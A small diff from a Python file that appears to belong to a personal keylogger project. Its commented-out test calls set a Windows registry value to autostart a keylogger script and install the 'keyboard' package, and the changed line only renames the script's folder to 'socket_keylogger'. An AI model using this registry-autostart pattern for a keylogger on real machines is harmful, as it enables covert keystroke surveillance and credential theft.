@@ -93,7 +93,7 @@ if __name__ == "__main__":
     # print(WindowsRegistryEditor.value_exists(key, sub_key, "Welcome"))
     # print(WindowsRegistryEditor.value_exists(key, sub_key, "Test"))
     # WindowsRegistryEditor.remove_value(key, sub_key, "welcome")
-    # WindowsRegistryEditor.edit_value(key, sub_key, "welcome", r'"C:\Users\melke\AppData\Local\Programs\Python\Python310\python.exe" "C:\Users\melke\Dev\PycharmProjects\Misc\Other_Projects\windows_keylogger\welcome.py"')
+    # WindowsRegistryEditor.edit_value(key, sub_key, "welcome", r'"C:\Users\melke\AppData\Local\Programs\Python\Python310\python.exe" "C:\Users\melke\Dev\PycharmProjects\Misc\Other_Projects\socket_keylogger\welcome.py"')
     # WindowsRegistryEditor.remove_value(key, sub_key, "test")
     # PackageManager.install_package("keyboard ")
     client_address = ("127.0.0.1", 5050)
